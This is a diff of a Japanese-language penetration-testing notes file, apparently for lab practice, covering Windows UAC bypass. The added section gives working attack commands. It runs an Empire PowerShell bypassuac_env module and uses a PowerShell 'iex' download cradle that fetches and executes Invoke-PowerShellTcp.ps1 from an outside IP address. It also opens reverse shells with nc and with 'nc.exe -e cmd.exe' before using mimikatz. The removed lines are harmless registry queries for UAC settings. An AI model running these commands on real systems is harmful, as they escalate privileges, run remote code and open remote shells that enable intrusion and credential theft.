@@ -182,21 +182,34 @@ https://github.com/hfiref0x/UACME
 
 
 
-### UAC設定(まだ未完成。詳細はURL参照)
+### Empire powershell
 
-https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
+* 事前にhttpリスナ及びlaunch.batのstagerでリバースシェルを取得しておく
+* bypassuacのモジュールを何パターンか試す
 
-```cmd
-REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
-
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA    REG_DWORD    0x1
+```
+usemodule powershell/privesc/bypassuac_env
+execute
 ```
 
-```cmd
-REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+* Empire powershellのshellが使いづらいので`/home/kali/Documents/tools/nishang/Shells`のpsをリモート実行してリバースシェルを取得する。ps1ファイルの最後に実行するリバースシェルを記載する
 
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
-```
+  ![image-20230202193255845](img/UACByPass/image-20230202193255845.png)
 
+* 以下コマンドをEmpire powershellで実行する
+
+  ```cmd
+  shell "iex(new-object net.webclient).downloadstring('http://192.168.119.133:8080/Invoke-PowerShellTcp.ps1')"
+  ```
+
+  ```bash
+  nc -lvnp 443
+  ```
+
+* mimikatzを使う場合はnc.exeを配送し、ここからさらにリバースシェルを張る
+
+  ```cmd
+  .\nc.exe -nv 192.168.119.132 1234 -e cmd.exe
+  ```
+
+  
